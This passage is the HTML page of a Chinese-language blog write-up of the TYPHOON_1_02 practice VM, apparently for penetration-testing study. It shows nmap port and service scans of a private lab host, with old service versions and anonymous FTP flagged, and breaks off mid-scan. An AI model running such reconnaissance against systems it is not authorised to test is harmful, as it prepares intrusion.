@@ -1,0 +1,790 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="TYPHOON_1_02 靶机信息收集123456789101112131415161718192021222324252627282930313233┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.121Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-01 11:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TYPHOON_1_02 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/3e56f363190c.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="TYPHOON_1_02 靶机信息收集123456789101112131415161718192021222324252627282930313233┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.121Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-01 11:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ede0fe412ccfa5048136ba76eb19ea4a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/219f294b6eb93236b79f18011d8156e1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b0c248169e8b56f98f95613301054fb0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/710cea9afc74812a7e9849adb1a8ca21_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/8bf6be7d70f75490908c417147aa396c_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/edb6435c1a143cde328c1f1bc80b1a06_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4afdd8ff3992c21cb9c5c890b730a8a4_MD5.png">
+<meta property="article:published_time" content="2023-07-02T06:35:12.000Z">
+<meta property="article:modified_time" content="2023-07-03T03:03:00.938Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/ede0fe412ccfa5048136ba76eb19ea4a_MD5.png">
+  
+  
+  
+  <title>TYPHOON_1_02 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TYPHOON_1_02 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-02 14:35" pubdate>
+          2023年7月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          48k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          398 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">TYPHOON_1_02 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="TYPHOON-1-02-靶机"><a href="#TYPHOON-1-02-靶机" class="headerlink" title="TYPHOON_1_02 靶机"></a>TYPHOON_1_02 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.121<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 11:44 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.121<br>Host is up (0.00028s latency).<br>Not shown: 65511 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>53/tcp    open  domain<br>80/tcp    open  http<br>110/tcp   open  pop3<br>111/tcp   open  rpcbind<br>139/tcp   open  netbios-ssn<br>143/tcp   open  imap<br>445/tcp   open  microsoft-ds<br>631/tcp   open  ipp<br>993/tcp   open  imaps<br>995/tcp   open  pop3s<br>2049/tcp  open  nfs<br>3306/tcp  open  mysql<br>5432/tcp  open  postgresql<br>6379/tcp  open  redis<br>8080/tcp  open  http-proxy<br>27017/tcp open  mongod<br>34114/tcp open  unknown<br>34329/tcp open  unknown<br>41559/tcp open  unknown<br>43004/tcp open  unknown<br>49357/tcp open  unknown<br>MAC Address: 08:00:27:2D:C0:8F (Oracle VirtualBox virtual NIC)<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.53 seconds<br></code></pre></td></tr></table></figure>
+
+<p>端口开放了好多……慢慢抽丝剥茧吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,25,53,80,110,111,139,143,445,631,993,995,2049,3306,5432,6379,8080,27017,34114,34329,41559,43004,49357 192.168.56.121<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 11:48 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.121<br>Host is up (0.00030s latency).<br><br>PORT      STATE SERVICE     VERSION<br>21/tcp    open  ftp         vsftpd 3.0.2<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to 192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.2 - secure, fast, stable<br>|_End of status<br>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 02:<span 